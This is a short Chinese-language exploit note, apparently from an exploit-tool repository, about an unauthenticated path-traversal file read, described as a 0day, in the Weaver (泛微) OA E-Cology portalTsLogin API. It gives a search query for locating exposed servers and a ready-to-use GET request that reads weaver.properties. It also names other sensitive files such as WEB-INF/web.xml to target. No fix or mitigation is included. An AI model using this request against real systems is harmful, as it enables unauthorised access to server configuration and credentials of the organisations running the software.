---
source: "LittleBear4/OA-EXPTOOL"
---

# 泛微OA portalTsLogin 0day 任意文件读取漏洞

## 漏洞描述

泛微OA E-Cology 的 `/api/portalTsLogin/utils/getE9DevelopAllNameValue2` 接口中 `fileName` 参数存在任意文件读取漏洞（0day）。该接口未做登录校验，攻击者无需登录，通过路径遍历即可读取服务器上的任意文件。

## 漏洞影响

```
泛微OA E-Cology
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现

```
GET /api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties HTTP/1.1
```

其中 `fileName` 经 URL 解码为 `portaldev_/../weaver.properties`，利用路径遍历读取配置文件。若响应返回文件内容，则漏洞存在。可替换路径读取 `WEB-INF/web.xml` 等敏感文件。
